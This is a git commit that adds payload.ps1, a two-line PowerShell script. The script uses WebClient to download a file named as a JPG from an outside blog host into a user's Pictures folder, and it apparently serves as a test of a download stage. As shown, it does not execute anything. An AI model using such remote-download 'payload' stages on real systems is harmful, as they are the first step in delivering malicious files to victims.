fdfd693df8ddc37138b90a6d05133c154d3a6d69
tomc0sm <76937076+tomc0sm@users.noreply.github.com>
2021-12-01 16:29:33 +0100

    Create payload.ps1

---
+++ payload.ps1
@@ -0,0 +1,2 @@
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("http://zizwar-bedehchere.vip-blog.com/medias/0307/zizwar-bedehchere-vip-blog-com-358953cyberfuck.jpg","C:\Users\thoma\Pictures\fuck.jpg")
